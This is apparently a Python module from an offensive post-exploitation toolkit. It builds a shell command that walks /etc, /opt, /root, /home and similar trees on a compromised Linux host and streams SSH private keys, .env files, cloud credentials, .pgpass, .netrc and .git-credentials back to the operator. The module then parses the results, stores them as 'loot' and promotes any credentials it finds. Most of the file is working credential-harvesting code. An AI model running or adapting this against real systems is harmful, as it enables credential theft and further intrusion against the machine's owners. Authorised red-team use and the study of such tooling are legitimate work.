"""On-box filesystem scrub — the same secret-scrubbers as :mod:`sharespider`,
against files on a target the operator already owns.

The gap this closes: ``sharespider`` scrubs SMB shares (pre-foothold enumeration).
Once you have a foothold — the whole reason fieldkit exists — the same secrets live
in ``/etc/``, ``/opt/<app>/``, ``$HOME/.aws/`` on that box, and nothing was walking
those trees.

Design: reuse the pure :data:`sharespider.SCRUBBERS` (rule 1 — the scrubbers are
``(local_path, share_path, text) -> [Hit]``, no I/O), and drive them with output
captured through :func:`fieldkit.executor.execute`. One command per host: a
``find | while read; head; echo delimiter`` pipeline that streams every candidate
file's contents, delimited so we can split them client-side. No files land on
disk on the attacker box — the parse happens in-memory.

Windows on-box scrub is a follow-up. For Windows footholds where you have SMB
admin access to the same box, ``fieldkit spider`` already covers this (spider
against localhost via SMB); the gap is a Windows shell-only foothold, which
needs a matching PowerShell-driven command and lands in a separate module.
"""
import re
from dataclasses import dataclass, field

from . import executor as executor_mod
from . import runner as runner_mod
from . import sharespider


DEFAULT_LINUX_PATHS = ("/etc", "/opt", "/root", "/home", "/var/www", "/srv")

#: Extensions and filenames to sweep. Overlaps sharespider's `_INTERESTING` set for
#: filename-only hits (SSH keys, .env, credentials files) plus the config/script
#: extensions where scrub_kv and scrub_webconfig actually parse content.
_FIND_TESTS = (
    "-name '*.yaml' -o -name '*.yml' -o -name '*.ini' "
    "-o -name '*.conf' -o -name '*.config' -o -name '*.cnf' "
    "-o -name '*.env' -o -name '.env*' "
    "-o -name '*.properties' -o -name '*.json' -o -name '*.xml' "
    "-o -name '*.sh' -o -name '*.ps1' -o -name '*.py' -o -name '*.rb' "
    "-o -name 'authorized_keys' -o -name 'id_rsa' -o -name 'id_ed25519' "
    "-o -name 'id_ecdsa' -o -name '*.pem' -o -name '*.ppk' "
    "-o -name '.pgpass' -o -name '.netrc' "
    "-o -name '.git-credentials' -o -name 'credentials' "
    "-o -name '*.pfx' -o -name '*.p12'"
)

_MAX_BYTES_PER_FILE = 50_000
_TIMEOUT = 300

_HDR = "==FK-FS==%s=="                # sentinel per file (path in the middle)
_TAIL = "==FK-FS/END=="


@dataclass
class FsScrubReport:
    host: str = None
    files_scrubbed: int = 0
    hits: list = field(default_factory=list)
    creds_promoted: int = 0
    aborted: str = None


def _build_command(paths, max_bytes):
    """One shell command that streams every candidate file with FK-FS delimiters.

    Uses ``head -c`` per file so a huge log does not blow the exec-transport buffer.
    ``-readable`` is a GNU find extension; a POSIX fallback (2>/dev/null) keeps the
    parse robust when a file is unreadable. ``-mount`` keeps us off NFS/procfs.
    """
    path_args = " ".join(f"'{p}'" for p in paths)
    return (
        f"find {path_args} -mount -type f -size -{max_bytes}c \\( {_FIND_TESTS} \\) "
        "2>/dev/null | "
        "while IFS= read -r f; do "
        f"  echo \"==FK-FS==$f==\"; "
        f"  head -c {max_bytes} \"$f\" 2>/dev/null; "
        f"  echo; echo \"{_TAIL}\"; "
        "done"
    )


_DELIM = re.compile(r"^==FK-FS==(.+?)==\s*$\n(.*?)\n==FK-FS/END==\s*$",
                    re.M | re.S)


def parse_stream(output):
    """Yield ``(remote_path, body)`` for every delimited chunk in the raw output.

    Pure — no I/O, no state. Broken chunks (missing tail, mid-write truncation)
    are skipped rather than raised: a real target might disconnect mid-stream and
    the operator wants what did come through, not an exception.
    """
    for m in _DELIM.finditer(output or ""):
        yield m.group(1).strip(), m.group(2)


def scrub_stream(output):
    """Run every scrubber over every chunk in ``output``, yielding :class:`Hit` rows.

    Pure over the (already captured) stream — the executor already ran the target
    command; this is what turns its output into loot.
    """
    for remote_path, body in parse_stream(output):
        # scrub_filename gets an empty body cheaply (it inspects the path only);
        # content scrubbers get the body and skip when it doesn't parse as text.
        for scrub in sharespider.SCRUBBERS:
            if scrub is sharespider.scrub_filename:
                yield from scrub(remote_path, remote_path, "")
            elif body:
                yield from scrub(remote_path, remote_path, body)


def fs_scrub(store, host, cred, *, paths=None, run=None, allow=("read-only",),
             timeout=_TIMEOUT, on_event=None):
    """Scrub a Linux foothold's filesystem for cleartext secrets.

    Runs ONE shell command through :func:`fieldkit.executor.execute` (rule 2: no
    child spawn here; the executor's runner is injected all the way through),
    parses the delimited stream, folds every :class:`Hit` into loot, and promotes
    any credential hit into the store — same shape as ``sharespider``.
    """
    if host["os"] and host["os"] != "linux":
        return FsScrubReport(host=host["ip"],
                             aborted=f"{host['ip']} is {host['os']} — on-box scrub is Linux-only "
                                     "(Windows: use `fieldkit spider` against the same host)")
    paths = tuple(paths) if paths else DEFAULT_LINUX_PATHS
    rep = FsScrubReport(host=host["ip"])
    emit = on_event or (lambda _m: None)

    action = executor_mod.Action(
        host=host, cred=cred,
        command=_build_command(paths, _MAX_BYTES_PER_FILE),
        label="fs-scrub", safety="read-only", shell="sh")
    res = executor_mod.execute(
        store, action, allow=list(allow), timeout=timeout,
        run=run or (lambda argv, env=None: runner_mod.run(argv, env_add=env,
                                                          timeout=timeout)),
        on_event=emit)
    if res.blocked:
        rep.aborted = res.blocked
        return rep
    if res.run is not None and res.run.error:
        rep.aborted = res.run.error
        return rep

    with store.transaction():
        for hit in scrub_stream(res.output or ""):
            rep.files_scrubbed += 1
            rep.hits.append(hit)
            store.add_step(
                cmd=f"scrub:{hit.kind}",
                output=f"{hit.share_path} — {hit.snippet}",
                exit_code=0, host_id=host["id"],
                label=f"fs-scrub:{hit.kind}")
            store.add_loot(host["id"], f"fs-scrub:{hit.kind}",
                           value=hit.share_path, path=None)
            if hit.credential:
                _, created = store.add_credential(hit.credential,
                                                  source=f"fs-scrub:{hit.kind}")
                rep.creds_promoted += 1 if created else 0

    emit(f"  fs-scrub {host['ip']}: {rep.files_scrubbed} hit(s), "
         f"{rep.creds_promoted} credential(s) promoted")
    return rep
